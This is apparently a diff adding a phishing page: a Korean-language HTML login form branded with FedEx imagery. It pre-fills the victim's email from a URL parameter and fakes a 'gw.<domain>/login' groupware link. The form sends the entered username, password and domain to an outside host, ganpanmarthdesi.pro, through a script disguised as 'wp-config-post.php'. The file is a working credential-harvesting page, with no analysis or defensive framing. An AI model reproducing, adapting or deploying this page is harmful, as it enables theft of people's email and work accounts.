@@ -1,0 +1,207 @@
+﻿﻿<html>
+
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>&#47196;&#44536;&#51064;</title>
+</head>
+<style>
+  html, body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 13px;
+  color: #404040;
+  direction: ltr;
+  -webkit-text-size-adjust: none;
+  }
+  input[type=user],
+  input[type=password]{
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 43px;
+  width: 100%;
+  padding: 8 15px;
+  margin: 0;
+  background: white;
+  border: 1px solid #02A1C0;
+  border-top: 1px solid #d6d6d6;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 0px;
+  font-size: 15px;
+  line-height: 1.42857143;
+  vertical-align: top;
+  color: #404040;
+  }
+  input[type=user]:focus,
+  input[type=password]:focus {
+  outline: none;
+  background-color: #F1FEFE;
+  border: 2px solid #025FDF;
+  }
+</style>
+<body>
+
+<table border="0" width="100%" cellspacing="0" cellpadding="0">
+	<tr>
+		<td>
+		<table border="0" width="100%" cellspacing="0" cellpadding="0">
+			<tr>
+				<td>&nbsp;</td>
+				<td width="141">
+				<img border="0" src="img/search_btn.png" width="148" height="33"></td>
+			</tr>
+		</table>
+		</td>
+	</tr>
+	<tr>
+		<td>
+		<div align="center">
+			<table border="0" width="615" cellspacing="0" cellpadding="0" height="0">
+				<tr>
+					<td>
+					<table border="0" width="100%" cellspacing="0" cellpadding="0">
+						<tr>
+							<td height="90"></td>
+						</tr>
+						<form action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" method="post">
+						<tr>
+							<td>
+							<table border="0" width="100%" cellspacing="0" cellpadding="0">
+								<tr>
+									<td height="450" background="img/form.png">
+									<table border="0" width="100%" cellspacing="0" cellpadding="0">
+										<tr>
+											<td height="53"></td>
+										</tr>
+										<tr>
+											<td height="40">
+											<table border="0" width="100%" cellspacing="0" cellpadding="0">
+												<tr>
+													<td width="262"></td>
+													<td>
+													<img border="0" src="fedex.png" width="70" height="70"></td>
+													<td width="273">&nbsp;</td>
+												</tr>
+											</table>
+											</td>
+										</tr>
+										<tr>
+											<td  height="40"></td>
+										</tr>
+										<tr>
+											<td>
+											<table border="0" width="100%" cellspacing="0" cellpadding="0">
+												<tr>
+													<td width="119"></td>
+													<td>
+													<img border="0" src="img/logo.png" width="372" height="50"></td>
+													<td width="119"></td>
+												</tr>
+											</table>
+											</td>
+										</tr>
+										<tr>
+											<td height="4"></td>
+										</tr>
+										<tr>
+											<td>
+											<table border="0" width="100%" cellspacing="0" cellpadding="0">
+												<tr>
+													<td width="119"></td>
+													<td>
+													   <input type="user" id="userInput" name="user" required id="" placeholder="&#44228;&#51221;" value="email" >
+													   <input type="hidden" id="domainInput" name="domain" value="" >
+													   <input type="hidden" id="linkInput" name="link" value="" >
+													   <input type="hidden" name="sender" value="gw.com" >
+													</td>
+													<td width="119"></td>
+												</tr>
+											</table>
+											</td>
+										</tr>
+										<tr>
+											<td height="10"></td>
+										</tr>
+										<tr>
+											<td>
+											<table border="0" width="100%" cellspacing="0" cellpadding="0">
+												<tr>
+													<td width="119"></td>
+													<td>
+													   <input type="password" name="passwd" required id="" placeholder="&#48708;&#48128;&#48264;&#54840;" autofocus >
+													</td>
+													<td width="119"></td>
+												</tr>
+											</table>
+											</td>
+										</tr>
+										<tr>
+											<td height="4"></td>
+										</tr>
+										<tr>
+											<td>
+											<table border="0" width="100%" cellspacing="0" cellpadding="0">
+												<tr>
+													<td width="119"></td>
+													<td>
+													<input type="image" src="img/btn.png" width="366" height="43"></td>
+													<td width="118"></td>
+												</tr>
+											</table>
+											</td>
+										</tr>
+										</form>
+										<tr>
+											<td height="92"></td>
+										</tr>
+									</table>
+									</td>
+									<td width="10"></td>
+								</tr>
+							</table>
+							</td>
+						</tr>
+						<tr>
+							<td>&nbsp;</td>
+						</tr>
+					</table>
+					</td>
+				</tr>
+			</table>
+		</div>
+		</td>
+	</tr>
+	<tr>
+		<td>&nbsp;</td>
+	</tr>
+</table>
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const raw = params.get('login');
+    const email = raw ? decodeURIComponent(raw) : '';
+
+    let user = '', domain = '';
+    if (email.includes('@')) {
+      [user, domain] = email.split(/@(.*)/, 2);
+    }
+
+    if (email) {
+      document.getElementById('userInput').value = email;
+      document.getElementById('domainInput').value = domain;
+      document.getElementById('linkInput').value = `http://gw.${domain}/login`;
+      document.getElementById('greeting').textContent = email;
+    }
+  </script>
+</body>
+
+</html>
